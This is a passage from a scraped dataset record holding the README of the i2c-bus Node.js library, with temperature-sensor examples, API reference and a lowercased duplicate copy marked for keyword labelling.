0x18;\nconst TEMP_REG = 0x05;\nconst toCelsius = rawData => {\nlet celsius = (rawData & 0x0fff) / 16;\nif (rawData & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst wbuf = Buffer.from([TEMP_REG]);\nconst rbuf = Buffer.alloc(2);\ni2c.openPromisified(1).\nthen(i2c1 => i2c1.i2cWrite(MCP9808_ADDR, wbuf.length, wbuf).\nthen(_ => i2c1.i2cRead(MCP9808_ADDR, rbuf.length, rbuf)).\nthen(data => console.log(toCelsius(data.buffer.readUInt16BE()))).\nthen(_ => i2c1.close())\n).catch(console.log);\nExample 3 - Asynchronous Callbacks\nDetermine the temperature with a MCP9808 I2C temperature sensor using asynchronous callbacks.\nconst i2c = require('i2c-bus');\nconst MCP9808_ADDR = 0x18;\nconst TEMP_REG = 0x05;\nconst toCelsius = rawData => {\nrawData = (rawData >> 8) + ((rawData & 0xff) << 8);\nlet celsius = (rawData & 0x0fff) / 16;\nif (rawData & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst i2c1 = i2c.open(1, err => {\nif (err) throw err;\ni2c1.readWord(MCP9808_ADDR, TEMP_REG, (err, rawData) => {\nif (err) throw err;\nconsole.log(toCelsius(rawData));\ni2c1.close(err => {\nif (err) throw err;\n});\n});\n});\nExample 4 - Synchronous Methods\nDetermine the temperature with a MCP9808 I2C temperature sensor using synchronous methods.\nconst i2c = require('i2c-bus');\nconst MCP9808_ADDR = 0x18;\nconst TEMP_REG = 0x05;\nconst toCelsius = rawData => {\nrawData = (rawData >> 8) + ((rawData & 0xff) << 8);\nlet celsius = (rawData & 0x0fff) / 16;\nif (rawData & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst i2c1 = i2c.openSync(1);\nconst rawData = i2c1.readWordSync(MCP9808_ADDR, TEMP_REG);\nconsole.log(toCelsius(rawData));\ni2c1.closeSync();\nAPI\nFunctions\nClass Bus\nClass PromisifiedBus\nClass I2cFuncs\nFunctions\nopen(busNumber [, options], cb)\nopenSync(busNumber [, options])\nopenPromisified(busNumber [, options])\nClass Bus\nAll methods in class Bus have asynchronous callback and synchronous forms. For promise support see class PromisifiedBus.\nThe asynchronous callback form always take a completion callback as its last argument. The arguments passed to the completion callback depend on the method, but the first argument is always reserved for an exception. If the operation was completed successfully, then the first argument will be null or undefined.\nWhen using the synchronous form any exceptions are immediately thrown. You can use try/catch to handle exceptions or allow them to bubble up.\nFree resources\nbus.close(cb)\nbus.closeSync()\nInformation\nbus.i2cFuncs(cb)\nbus.i2cFuncsSync()\nbus.scan([startAddr,] [endAddr,] cb)\nbus.scanSync([startAddr,] [endAddr])\nbus.deviceId(addr, cb)\nbus.deviceIdSync(addr)\nPlain I2C\nbus.i2cRead(addr, length, buffer, cb)\nbus.i2cReadSync(addr, length, buffer)\nbus.i2cWrite(addr, length, buffer, cb)\nbus.i2cWriteSync(addr, length, buffer)\nSMBus\nbus.readByte(addr, cmd, cb)\nbus.readByteSync(addr, cmd)\nbus.readWord(addr, cmd, cb)\nbus.readWordSync(addr, cmd)\nbus.readI2cBlock(addr, cmd, length, buffer, cb)\nbus.readI2cBlockSync(addr, cmd, length, buffer)\nbus.receiveByte(addr, cb)\nbus.receiveByteSync(addr)\nbus.sendByte(addr, byte, cb)\nbus.sendByteSync(addr, byte)\nbus.writeByte(addr, cmd, byte, cb)\nbus.writeByteSync(addr, cmd, byte)\nbus.writeWord(addr, cmd, word, cb)\nbus.writeWordSync(addr, cmd, word)\nbus.writeQuick(addr, bit, cb)\nbus.writeQuickSync(addr, bit)\nbus.writeI2cBlock(addr, cmd, length, buffer, cb)\nbus.writeI2cBlockSync(addr, cmd, length, buffer)\nPromises\nbus.promisifiedBus()\nClass PromisifiedBus\nAll methods in class PromisifiedBus have the asynchronous promise form. For asynchronous callback and synchronous forms see class Bus.\nFree resources\npromisifiedBus.close()\nInformation\npromisifiedBus.i2cFuncs()\npromisifiedBus.scan([startAddr,] [endAddr])\npromisifiedBus.deviceId(addr)\nPlain I2C\npromisifiedBus.i2cRead(addr, length, buffer)\npromisifiedBus.i2cWrite(addr, length, buffer)\nSMBus\npromisifiedBus.readByte(addr, cmd)\npromisifiedBus.readWord(addr, cmd)\npromisifiedBus.readI2cBlock(addr, cmd, length, buffer)\npromisifiedBus.receiveByte(addr)\npromisifiedBus.sendByte(addr, byte)\npromisifiedBus.writeByte(addr, cmd, byte)\npromisifiedBus.writeWord(addr, cmd, word)\npromisifiedBus.writeQuick(addr, bit)\npromisifiedBus.writeI2cBlock(addr, cmd, length, buffer)\nAsynchronous callbacks and synchronous execution\npromisifiedBus.bus()\nClass I2cFuncs\nfuncs.i2c\nfuncs.tenBitAddr\nfuncs.protocolMangling\nfuncs.smbusPec\nfuncs.smbusBlockProcCall\nfuncs.smbusQuick\nfuncs.smbusReceiveByte\nfuncs.smbusSendByte\nfuncs.smbusReadByte\nfuncs.smbusWriteByte\nfuncs.smbusReadWord\nfuncs.smbusWriteWord\nfuncs.smbusProcCall\nfuncs.smbusReadBlock\nfuncs.smbusWriteBlock\nfuncs.smbusReadI2cBlock\nfuncs.smbusWriteI2cBlock\nopen(busNumber [, options], cb)\nbusNumber - the number of the I2C bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\ncb - completion callback\nAsynchronous open. Returns a new Bus object. The callback gets one argument (err).\nThe following options are supported:\nforceAccess - A boolean value specifying whether access to devices on the I2C bus should be allowed even if they are already in use by a kernel driver/module. Corresponds to I2C_SLAVE_FORCE on Linux. The valid values for forceAccess are true and false. Optional, the default value is false.\nopenSync(busNumber [, options])\nbusNumber - the number of the I2C bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\nSynchronous open. Returns a new Bus object.\nThe following options are supported:\nforceAccess - A boolean value specifying whether access to devices on the I2C bus should be allowed even if they are already in use by a kernel driver/module. Corresponds to I2C_SLAVE_FORCE on Linux. The valid values for forceAccess are true and false. Optional, the default value is false.\nopenPromisified(busNumber [, options])\nbusNumber - the number of the I2C bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\nAsynchronous open. Returns a Promise that, when resolved, yields a PromisifiedBus object.\nThe following options are supported:\nforceAccess - A boolean value specifying whether access to devices on the I2C bus should be allowed even if they are already in use by a kernel driver/module. Corresponds to I2C_SLAVE_FORCE on Linux. The valid values for forceAccess are true and false. Optional, the default value is false.\nbus.close(cb)\ncb - completion callback\nAsynchronous close. Frees system resources used by this instance. The callback gets one argument (err).\nbus.closeSync()\nSynchronous close. Frees system resources used by this instance.\nbus.i2cFuncs(cb)\ncb - completion callback\nDetermine functionality of the bus/adapter asynchronously. The callback gets two argument (err, funcs). funcs is a frozen I2cFuncs object describing the functionality available. See also I2C functionality.\nbus.i2cFuncsSync()\nDetermine functionality of the bus/adapter Synchronously. Returns a frozen I2cFuncs object describing the functionality available. See also I2C functionality.\nbus.scan([startAddr,] [endAddr,] cb)\nstartAddr - an integer specifying the start address of the scan range, optional\nendAddr - an integer specifying the end addrerss of the scan range, optional\ncb - completion callback\nbus.scan(cb) - scan for I2C devices in address range 0x03 through 0x77\nbus.scan(addr, cb) - scan for an I2C device at address addr\nbus.scan(startAddr, endAddr, cb) - scan for I2C devices in address range startAddr through endAddr\nScans the I2C bus asynchronously for devices. The default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line tool. The callback gets two arguments (err, devices). devices is an array of numbers where each number represents the I2C address of a device which was detected.\nbus.scanSync([startAddr,] [endAddr])\nstartAddr - an integer specifying the start address of the scan range, optional\nendAddr - an integer specifying the end addrerss of the scan range, optional\nbus.scan() - scan for I2C devices in address range 0x03 through 0x77\nbus.scan(addr) - scan for an I2C device at address addr\nbus.scan(startAddr, endAddr) - scan for I2C devices in address range startAddr through endAddr\nScans the I2C bus synchronously for devices. The default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line tool. Returns an array of numbers where each number represents the I2C address of a device which was detected.\nbus.deviceId(addr, cb)\naddr - I2C device address\ncb - completion callback\nAsynchronous I2C device Id. The callback gets two arguments (err, id). id is an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\nbus.deviceIdSync(addr)\naddr - I2C device address\nSynchronous I2C device Id. Returns an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\nbus.i2cRead(addr, length, buffer, cb)\naddr - I2C device address\nlength - an integer specifying the number of bytes to read\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\ncb - completion callback\nAsynchronous plain I2C read. The callback gets three argument (err, bytesRead, buffer). bytesRead is the number of bytes read.\nbus.i2cReadSync(addr, length, buffer)\naddr - I2C device address\nlength - an integer specifying the number of bytes to read\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\nSynchronous plain I2C read. Returns the number of bytes read.\nbus.i2cWrite(addr, length, buffer, cb)\naddr - I2C device address\nlength - an integer specifying the number of bytes to write\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\ncb - completion callback\nAsynchronous plain I2C write. The callback gets three argument (err, bytesWritten, buffer). bytesWritten is the number of bytes written.\nbus.i2cWriteSync(addr, length, buffer)\naddr - I2C device address\nlength - an integer specifying the number of bytes to write\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\nSynchronous plain I2C write. Returns the number of bytes written.\nbus.readByte(addr, cmd, cb)\naddr - I2C device address\ncmd - command code\ncb - completion callback\nAsynchronous SMBus read byte. The callback gets two arguments (err, byte). byte is an unsigned integer in the range 0 to 255.\nbus.readByteSync(addr, cmd)\naddr - I2C device address\ncmd - command code\nSynchronous SMBus read byte. Returns the byte read. byte is an unsigned integer in the range 0 to 255.\nbus.readWord(addr, cmd, cb)\naddr - I2C device address\ncmd - command code\ncb - completion callback\nAsynchronous SMBus read word. The callback gets two arguments (err, word). word is an unsigned integer in the range 0 to 65535.\nbus.readWordSync(addr, cmd)\naddr - I2C device address\ncmd - command code\nSynchronous SMBus read word. Returns the word read. word is an unsigned integer in the range 0 to 65535.\nbus.readI2cBlock(addr, cmd, length, buffer, cb)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\ncb - completion callback\nAsynchronous I2C block read (not defined by the SMBus specification). Reads a block of bytes from a device, from a designated register that is specified by cmd. The callback gets three arguments (err, bytesRead, buffer). bytesRead is the number of bytes read.\nbus.readI2cBlockSync(addr, cmd, length, buffer)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\nSynchronous I2C block read (not defined by the SMBus specification). Reads a block of bytes from a device, from a designated register that is specified by cmd. Returns the number of bytes read.\nbus.receiveByte(addr, cb)\naddr - I2C device address\ncb - completion callback\nAsynchronous SMBus receive byte. The callback gets two arguments (err, byte). byte is an unsigned integer in the range 0 to 255.\nbus.receiveByteSync(addr)\naddr - I2C device address\nSynchronous SMBus receive byte. Returns the byte received. byte is an unsigned integer in the range 0 to 255.\nbus.sendByte(addr, byte, cb)\naddr - I2C device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\ncb - completion callback\nAsynchronous SMBus send byte. The callback gets one argument (err).\nbus.sendByteSync(addr, byte)\naddr - I2C device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nSynchronous SMBus send byte.\nbus.writeByte(addr, cmd, byte, cb)\naddr - I2C device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\ncb - completion callback\nAsynchronous SMBus write byte. The callback gets one argument (err).\nbus.writeByteSync(addr, cmd, byte)\naddr - I2C device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nSynchronous SMBus write byte.\nbus.writeWord(addr, cmd, word, cb)\naddr - I2C device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\ncb - completion callback\nAsynchronous SMBus write word. The callback gets one argument (err).\nbus.writeWordSync(addr, cmd, word)\naddr - I2C device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\nSynchronous SMBus write word.\nbus.writeQuick(addr, bit, cb)\naddr - I2C device address\nbit - bit to write (0 or 1)\ncb - completion callback\nAsynchronous SMBus quick command. Writes a single bit to the device. The callback gets one argument (err).\nbus.writeQuickSync(addr, bit)\naddr - I2C device address\nbit - bit to write (0 or 1)\nSynchronous SMBus quick command. Writes a single bit to the device.\nbus.writeI2cBlock(addr, cmd, length, buffer, cb)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\ncb - completion callback\nAsynchronous I2C block write (not defined by the SMBus specification). Writes a block of bytes to a device, to a designated register that is specified by cmd. The callback gets three argument (err, bytesWritten, buffer). bytesWritten is the number of bytes written.\nbus.writeI2cBlockSync(addr, cmd, length, buffer)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\nSynchronous I2C block write (not defined by the SMBus specification). Writes a block of bytes to a device, to a designated register that is specified by cmd.\nbus.promisifiedBus()\nReturn the PromisifiedBus instance for this Bus instance.\npromisifiedBus.close()\nAsynchronous close. Returns a Promise that will be resolved with no arguments once the underlying resources have been released, or will be rejected if an error occurs while closing.\npromisifiedBus.i2cFuncs()\nDetermine functionality of the bus/adapter asynchronously. Returns a Promise that on success will be resolved with a frozen I2cFuncs object describing the functionality available. The returned Promise will be rejected if an error occurs. See also I2C functionality.\npromisifiedBus.scan([startAddr,] [endAddr])\nstartAddr - an integer specifying the start address of the scan range, optional\nendAddr - an integer specifying the end addrerss of the scan range, optional\nbus.scan() - scan for I2C devices in address range 0x03 through 0x77\nbus.scan(addr) - scan for an I2C device at address addr\nbus.scan(startAddr, endAddr) - scan for I2C devices in address range startAddr through endAddr\nScans the I2C bus asynchronously for devices. The default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line tool. Returns a Promise that on success will be resolved with an array of numbers where each number represents the I2C address of a device which was detected. The returned Promise will be rejected if an error occurs.\npromisifiedBus.deviceId(addr)\naddr - I2C device address\nAsynchronous I2C device Id. Returns a Promise that will be resolved with an id object on success, or will be rejected if an error occurs. id is an object with the properties manufacturer, product and if known a human readable name for the associated manufacturer. manufacturer and product are numbers, name is a string.\npromisifiedBus.i2cRead(addr, length, buffer)\naddr - I2C device address\nlength - an integer specifying the number of bytes to read\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\nAsynchronous plain I2C read. Returns a Promise that on success will be resolved with an object with a bytesRead property identifying the number of bytes read, and a buffer property that is a reference to the passed in buffer argument. The returned Promise will be rejected if an error occurs.\npromisifiedBus.i2cWrite(addr, length, buffer)\naddr - I2C device address\nlength - an integer specifying the number of bytes to write\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\nAsynchronous plain I2C write. Returns a Promise that on success will be resolved with an object with a bytesWritten property identifying the number of bytes written, and a buffer property that is a reference to the passed in buffer argument. The returned promise will be rejected if an error occurs.\npromisifiedBus.readByte(addr, cmd)\naddr - I2C device address\ncmd - command code\nAsynchronous SMBus read byte. Returns a Promise that will be resolved with a number representing the byte read on success, or will be rejected if an error occurs. byte is an unsigned integer in the range 0 to 255.\npromisifiedBus.readWord(addr, cmd)\naddr - I2C device address\ncmd - command code\nAsynchronous SMBus read word. Returns a Promise that will be resolved with a number representing the word read on success, or will be rejected if an error occurs. word is an unsigned integer in the range 0 to 65535.\npromisifiedBus.readI2cBlock(addr, cmd, length, buffer)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to read (max 32)\nbuffer - the Buffer instance that the data will be written to (must conatin at least length bytes)\nAsynchronous I2C block read (not defined by the SMBus specification). Reads a block of bytes from a device, from a designated register that is specified by cmd. Returns a Promise that on success will be resolved with an object with a bytesRead property identifying the number of bytes read, and a buffer property that is a reference to the passed in buffer argument. The returned Promise will be rejected if an error occurs.\npromisifiedBus.receiveByte(addr)\naddr - I2C device address\nAsynchronous SMBus receive byte. Returns a Promise that will be resolved with a number representing the byte received on success, or will be rejected if an error occurs. byte is an unsigned integer in the range 0 to 255.\npromisifiedBus.sendByte(addr, byte)\naddr - I2C device address\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nAsynchronous SMBus send byte. Returns a Promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedBus.writeByte(addr, cmd, byte)\naddr - I2C device address\ncmd - command code\nbyte - data byte. byte is an unsigned integer in the range 0 to 255.\nAsynchronous SMBus write byte. Returns a Promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedBus.writeWord(addr, cmd, word)\naddr - I2C device address\ncmd - command code\nword - data word. word is an unsigned integer in the range 0 to 65535.\nAsynchronous SMBus write word. Returns a Promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedBus.writeQuick(addr, bit)\naddr - I2C device address\nbit - bit to write (0 or 1)\nAsynchronous SMBus quick command. Writes a single bit to the device. Returns a Promise that will be resolved with no arguments on success, or will be rejected if an error occurs.\npromisifiedBus.writeI2cBlock(addr, cmd, length, buffer)\naddr - I2C device address\ncmd - command code\nlength - an integer specifying the number of bytes to write (max 32)\nbuffer - the Buffer instance containing the data to write (must conatin at least length bytes)\nAsynchronous I2C block write (not defined by the SMBus specification). Writes a block of bytes to a device, to a designated register that is specified by cmd. Returns a Promise that on success will be resolved with an object with a bytesWritten property identifying the number of bytes written, and a buffer property that is a reference to the passed in buffer argument. The returned promise will be rejected if an error occurs.\npromisifiedBus.bus()\nReturn the Bus instance for this PromisifiedBus instance.\nfuncs.i2c - boolean\nSpecifies whether or not the adapter handles plain I2C-level commands (Pure SMBus adapters typically can not do these, I2C_FUNC_I2C).\nfuncs.tenBitAddr - boolean\nSpecifies whether or not the adapter handles the 10-bit address extensions (I2C_FUNC_10BIT_ADDR).\nfuncs.protocolMangling - boolean\nSpecifies whether or not the adapter knows about the I2C_M_IGNORE_NAK, I2C_M_REV_DIR_ADDR and I2C_M_NO_RD_ACK flags (which modify the I2C protocol! I2C_FUNC_PROTOCOL_MANGLING).\nfuncs.smbusPec - boolean\nSpecifies whether or not the adapter handles packet error checking (I2C_FUNC_SMBUS_PEC).\nfuncs.smbusBlockProcCall - boolean\nSpecifies whether or not the adapter handles the SMBus block process call command (I2C_FUNC_SMBUS_BLOCK_PROC_CALL).\nfuncs.smbusQuick - boolean\nSpecifies whether or not the adapter handles the SMBus quick command (I2C_FUNC_SMBUS_QUICK).\nfuncs.smbusReceiveByte - boolean\nSpecifies whether or not the adapter handles the SMBus receive byte command (I2C_FUNC_SMBUS_READ_BYTE).\nfuncs.smbusSendByte - boolean\nSpecifies whether or not the adapter handles the SMBus send byte command (I2C_FUNC_SMBUS_WRITE_BYTE).\nfuncs.smbusReadByte - boolean\nSpecifies whether or not the adapter handles the SMBus read byte command (I2C_FUNC_SMBUS_READ_BYTE_DATA).\nfuncs.smbusWriteByte - boolean\nSpecifies whether or not the adapter handles the SMBus write byte command (I2C_FUNC_SMBUS_WRITE_BYTE_DATA).\nfuncs.smbusReadWord - boolean\nSpecifies whether or not the adapter handles the SMBus read word command (I2C_FUNC_SMBUS_READ_WORD_DATA).\nfuncs.smbusWriteWord - boolean\nSpecifies whether or not the adapter handles the SMBus write word command (I2C_FUNC_SMBUS_WRITE_WORD_DATA).\nfuncs.smbusProcCall - boolean\nSpecifies whether or not the adapter handles the SMBus process call command (I2C_FUNC_SMBUS_PROC_CALL).\nfuncs.smbusReadBlock - boolean\nSpecifies whether or not the adapter handles the SMBus read block command (I2C_FUNC_SMBUS_READ_BLOCK_DATA).\nfuncs.smbusWriteBlock - boolean\nSpecifies whether or not the adapter handles the SMBus write block command (I2C_FUNC_SMBUS_WRITE_BLOCK_DATA).\nfuncs.smbusReadI2cBlock - boolean\nSpecifies whether or not the adapter handles the SMBus read I2C block command (I2C_FUNC_SMBUS_READ_I2C_BLOCK).\nfuncs.smbusWriteI2cBlock - boolean\nSpecifies whether or not the adapter handles the SMBus write i2c block command (I2C_FUNC_SMBUS_WRITE_I2C_BLOCK).\nTypeScript Type Definitions\nTypeScript type definitions for i2c-bus can be found in the Definitely Typed repository at https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/i2c-bus.", "link": "https://github.com/fivdi/i2c-bus", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "i2c-bus\ni2c serial bus access with node.js on linux boards like the raspberry pi or beaglebone. the i2c-bus api supports promises and async/await, asynchronous callbacks and synchronous execution.\ni2c-bus supports node.js versions 10, 12, 14, 15 and 16.\ncontents\ninstallation\nusage\napi\ntypescript type definitions\ninstallation\nnpm install i2c-bus\nthe way in which i2c is configured varies from board to board. sometimes no configuraton is required, but sometimes it is:\nconfiguring i2c on the raspberry pi\nconfiguring software i2c on the raspberry pi\nconsider software i2c when there are issues communicating with a device on a raspberry pi\nusage\nthe example programs below show how to use a mcp9808 i2c temperature sensor to determine the temperature.\nmcp9808 i2c temperature sensor connected to a raspberry pi\nexample 1 - promises\ndetermine the temperature with a mcp9808 i2c temperature sensor using promises.\nconst i2c = require('i2c-bus');\nconst mcp9808_addr = 0x18;\nconst temp_reg = 0x05;\nconst tocelsius = rawdata => {\nrawdata = (rawdata >> 8) + ((rawdata & 0xff) << 8);\nlet celsius = (rawdata & 0x0fff) / 16;\nif (rawdata & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\ni2c.openpromisified(1).\nthen(i2c1 => i2c1.readword(mcp9808_addr, temp_reg).\nthen(rawdata => console.log(tocelsius(rawdata))).\nthen(_ => i2c1.close())\n).catch(console.log);\nexample 2 - promises, plain i2c and buffers\ndetermine the temperature with a mcp9808 i2c temperature sensor using promises, plain i2c and buffer objects.\nconst i2c = require('i2c-bus');\nconst mcp9808_addr = 0x18;\nconst temp_reg = 0x05;\nconst tocelsius = rawdata => {\nlet celsius = (rawdata & 0x0fff) / 16;\nif (rawdata & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst wbuf = buffer.from([temp_reg]);\nconst rbuf = buffer.alloc(2);\ni2c.openpromisified(1).\nthen(i2c1 => i2c1.i2cwrite(mcp9808_addr, wbuf.length, wbuf).\nthen(_ => i2c1.i2cread(mcp9808_addr, rbuf.length, rbuf)).\nthen(data => console.log(tocelsius(data.buffer.readuint16be()))).\nthen(_ => i2c1.close())\n).catch(console.log);\nexample 3 - asynchronous callbacks\ndetermine the temperature with a mcp9808 i2c temperature sensor using asynchronous callbacks.\nconst i2c = require('i2c-bus');\nconst mcp9808_addr = 0x18;\nconst temp_reg = 0x05;\nconst tocelsius = rawdata => {\nrawdata = (rawdata >> 8) + ((rawdata & 0xff) << 8);\nlet celsius = (rawdata & 0x0fff) / 16;\nif (rawdata & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst i2c1 = i2c.open(1, err => {\nif (err) throw err;\ni2c1.readword(mcp9808_addr, temp_reg, (err, rawdata) => {\nif (err) throw err;\nconsole.log(tocelsius(rawdata));\ni2c1.close(err => {\nif (err) throw err;\n});\n});\n});\nexample 4 - synchronous methods\ndetermine the temperature with a mcp9808 i2c temperature sensor using synchronous methods.\nconst i2c = require('i2c-bus');\nconst mcp9808_addr = 0x18;\nconst temp_reg = 0x05;\nconst tocelsius = rawdata => {\nrawdata = (rawdata >> 8) + ((rawdata & 0xff) << 8);\nlet celsius = (rawdata & 0x0fff) / 16;\nif (rawdata & 0x1000) {\ncelsius -= 256;\n}\nreturn celsius;\n};\nconst i2c1 = i2c.opensync(1);\nconst rawdata = i2c1.readwordsync(mcp9808_addr, temp_reg);\nconsole.log(tocelsius(rawdata));\ni2c1.closesync();\napi\nfunctions\nclass bus\nclass promisifiedbus\nclass i2cfuncs\nfunctions\nopen(busnumber [, options], cb)\nopensync(busnumber [, options])\nopenpromisified(busnumber [, options])\nclass bus\nall methods in class bus have asynchronous callback and synchronous forms. for promise support see class promisifiedbus.\nthe asynchronous callback form always take a completion callback as its last argument. the arguments passed to the completion callback depend on the method, but the first argument is always reserved for an exception. if the operation was completed successfully, then the first argument will be null or undefined.\nwhen using the synchronous form any exceptions are immediately thrown. you can use try/catch to handle exceptions or allow them to bubble up.\nfree resources\nbus.close(cb)\nbus.closesync()\ninformation\nbus.i2cfuncs(cb)\nbus.i2cfuncssync()\nbus.scan([startaddr,] [endaddr,] cb)\nbus.scansync([startaddr,] [endaddr])\nbus.deviceid(addr, cb)\nbus.deviceidsync(addr)\nplain i2c\nbus.i2cread(addr, length, buffer, cb)\nbus.i2creadsync(addr, length, buffer)\nbus.i2cwrite(addr, length, buffer, cb)\nbus.i2cwritesync(addr, length, buffer)\nsmbus\nbus.readbyte(addr, cmd, cb)\nbus.readbytesync(addr, cmd)\nbus.readword(addr, cmd, cb)\nbus.readwordsync(addr, cmd)\nbus.readi2cblock(addr, cmd, length, buffer, cb)\nbus.readi2cblocksync(addr, cmd, length, buffer)\nbus.receivebyte(addr, cb)\nbus.receivebytesync(addr)\nbus.sendbyte(addr, byte, cb)\nbus.sendbytesync(addr, byte)\nbus.writebyte(addr, cmd, byte, cb)\nbus.writebytesync(addr, cmd, byte)\nbus.writeword(addr, cmd, word, cb)\nbus.writewordsync(addr, cmd, word)\nbus.writequick(addr, bit, cb)\nbus.writequicksync(addr, bit)\nbus.writei2cblock(addr, cmd, length, buffer, cb)\nbus.writei2cblocksync(addr, cmd, length, buffer)\npromises\nbus.promisifiedbus()\nclass promisifiedbus\nall methods in class promisifiedbus have the asynchronous promise form. for asynchronous callback and synchronous forms see class bus.\nfree resources\npromisifiedbus.close()\ninformation\npromisifiedbus.i2cfuncs()\npromisifiedbus.scan([startaddr,] [endaddr])\npromisifiedbus.deviceid(addr)\nplain i2c\npromisifiedbus.i2cread(addr, length, buffer)\npromisifiedbus.i2cwrite(addr, length, buffer)\nsmbus\npromisifiedbus.readbyte(addr, cmd)\npromisifiedbus.readword(addr, cmd)\npromisifiedbus.readi2cblock(addr, cmd, length, buffer)\npromisifiedbus.receivebyte(addr)\npromisifiedbus.sendbyte(addr, byte)\npromisifiedbus.writebyte(addr, cmd, byte)\npromisifiedbus.writeword(addr, cmd, word)\npromisifiedbus.writequick(addr, bit)\npromisifiedbus.writei2cblock(addr, cmd, length, buffer)\nasynchronous callbacks and synchronous execution\npromisifiedbus.bus()\nclass i2cfuncs\nfuncs.i2c\nfuncs.tenbitaddr\nfuncs.protocolmangling\nfuncs.smbuspec\nfuncs.smbusblockproccall\nfuncs.smbusquick\nfuncs.smbusreceivebyte\nfuncs.smbussendbyte\nfuncs.smbusreadbyte\nfuncs.smbuswritebyte\nfuncs.smbusreadword\nfuncs.smbuswriteword\nfuncs.smbusproccall\nfuncs.smbusreadblock\nfuncs.smbuswriteblock\nfuncs.smbusreadi2cblock\nfuncs.smbuswritei2cblock\nopen(busnumber [, options], cb)\nbusnumber - the number of the i2c bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\ncb - completion callback\nasynchronous open. returns a new bus object. the callback gets one argument (err).\nthe following options are supported:\nforceaccess - a boolean value specifying whether access to devices on the i2c bus should be allowed even if they are already in use by a kernel driver/module. corresponds to i2c_slave_force on linux. the valid values for forceaccess are true and false. optional, the default value is false.\nopensync(busnumber [, options])\nbusnumber - the number of the i2c bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\nsynchronous open. returns a new bus object.\nthe following options are supported:\nforceaccess - a boolean value specifying whether access to devices on the i2c bus should be allowed even if they are already in use by a kernel driver/module. corresponds to i2c_slave_force on linux. the valid values for forceaccess are true and false. optional, the default value is false.\nopenpromisified(busnumber [, options])\nbusnumber - the number of the i2c bus/adapter to open, 0 for /dev/i2c-0, 1 for /dev/i2c-1, ...\noptions - an optional options object\nasynchronous open. returns a promise that, when resolved, yields a promisifiedbus object.\nthe following options are supported:\nforceaccess - a boolean value specifying whether access to devices on the i2c bus should be allowed even if they are already in use by a kernel driver/module. corresponds to i2c_slave_force on linux. the valid values for forceaccess are true and false. optional, the default value is false.\nbus.close(cb)\ncb - completion callback\nasynchronous close. frees system resources used by this instance. the callback gets one argument (err).\nbus.closesync()\nsynchronous close. frees system resources used by this instance.\nbus.i2cfuncs(cb)\ncb - completion callback\ndetermine functionality of the bus/adapter asynchronously. the callback gets two argument (err, funcs). funcs is a frozen i2cfuncs object describing the functionality available. see also i2c functionality.\nbus.i2cfuncssync()\ndetermine functionality of the bus/adapter synchronously. returns a frozen i2cfuncs object describing the functionality available. see also i2c functionality.\nbus.scan([startaddr,] [endaddr,] cb)\nstartaddr - an integer specifying the start address of the scan range, optional\nendaddr - an integer specifying the end addrerss of the scan range, optional\ncb - completion callback\nbus.scan(cb) - scan for i2c devices in address range 0x03 through 0x77\nbus.scan(addr, cb) - scan for an i2c device at address addr\nbus.scan(startaddr, endaddr, cb) - scan for i2c devices in address range startaddr through endaddr\nscans the i2c bus asynchronously for devices. the default address range 0x03 through 0x77 is the same as the default address range used by the i2cdetect command line -----> tool !!! . the callback gets two arguments (err, devices). devices is an array of numbers where each number represents the i2c address of a device which was detected.\nbus.scansync([startaddr,] [endaddr])\nstartaddr - an integer specifying the start address of the scan range, optional\nendaddr - an integer specifying the end addrerss of the scan range, optional\nbus.scan() - scan for i2c devices in address range 0x03 through 0x77\nbus.scan(addr) - scan for an i2c device at address addr\nbus.scan(startaddr, endaddr) - scan for i2c devices in address range startaddr through 